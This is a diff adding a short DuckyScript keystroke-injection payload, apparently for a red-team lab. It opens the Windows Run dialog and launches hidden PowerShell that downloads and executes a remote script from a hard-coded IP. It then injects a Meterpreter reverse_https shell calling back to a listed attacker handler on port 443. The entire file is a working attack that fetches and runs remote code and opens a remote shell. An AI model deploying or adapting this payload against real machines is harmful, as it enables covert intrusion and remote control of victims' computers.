@@ -1,0 +1,13 @@
+REM Execute Shell Code From Memory
+REM Pulls From WindowsUpdate Box on Lab IIS Server
+REM -------LHOST Handlers--------
+REM OB-KALI-01 - 159.246.160.60
+REM OB-KALI-02 - 159.246.160.63
+REM IN-Kali-01 - 159.246.80.15
+REM IN-Kali-02 - 159.246.80.16
+REM ----------------------------
+DELAY 1500
+GUI r
+DELAY 250
+STRING cmd.exe /c powershell -windowstyle hidden "IEX (New-Object Net.WebClient).DownloadString('http://159.246.160.77/1/1.txt'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 159.246.160.60 -Lport 443 -force"
+ENTER
